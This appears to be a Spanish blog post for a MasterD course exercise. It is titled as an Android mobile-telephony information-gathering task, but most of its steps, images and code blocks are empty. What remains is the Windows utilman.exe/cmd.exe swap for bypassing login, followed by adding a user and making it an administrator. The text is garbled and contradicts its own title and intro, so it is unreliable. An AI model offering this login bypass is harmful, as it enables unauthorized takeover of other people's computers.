---
title: MTD - Telefonía móvil 1
published: true
categories: [Android]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Dificil]
---


¡Hola! 
Vamos a realizar el primer ejercicio de Telefonía móvil. En este primer ejercicio necesitamos obtener toda la información posible del dispositivo móvil con el que vamos a trabajar. Podremos emplear cualquier recurso a nuestra disposición, siempre que sea legal.

## HERRAMIENTAS UTILIZADAS
* 
* 
* 
*  



* * *

## PRIMEROS PASOS
En primer lugar necesitaremos bajarnos la máquina principal sobre la que vamos a trabajar, para ello yo estoy utilizando el archivo .iso de Android-Studio, la forma de instalación es muy sencilla y no tiene mucha complicación, de todas maneras dejo el link utilizado para la descarga y un vídeo que puede servir de ayuda para la instalación.

<img src="/assets/HTB/Android">



<img src="/assets/HTB/Android/">


<img src="/assets/HTB/Android/">
<img src="/assets/HTB/Android/">
<img src="/assets/HTB/Android/">

* 

* * * 

# DENTRO DE LA TERMINAL


```bash 

```



```bash
DISKPART>
```

<img src="/assets/HTB/Android/">

* 

```bash
DISKPART> 
```



```bash
X:> c:
```


```bash
C:> cd System32
```

```
C:\Windows\System32> move utilman.exe utilman.exe.bak
```

```bash
C:\Windows\System32> copy cmd.exe utilman.exe
```

Seguido de ello escribiremos el comando 

```bash
C:\Windows\System32> Wpeutil reboot
```


<img src="/assets/HTB/Android/">



```bash
C:\Windows\System32> net user "Nombre de usuario que quieras" /add
```

* 

```bash
C:\Windows\System32> net localgroup
```

```bash
C:
```
* 

`net localgroup Administradores Marin /add`


# DENTRO DE NUESTRO SISTEMA OPERATIVO


1. 
2. 
3. 
4. c





* * *

*__Esto es un trabajo realizado para MasterD con fines didácticos, no está enseñado para otro de sus usos.__*
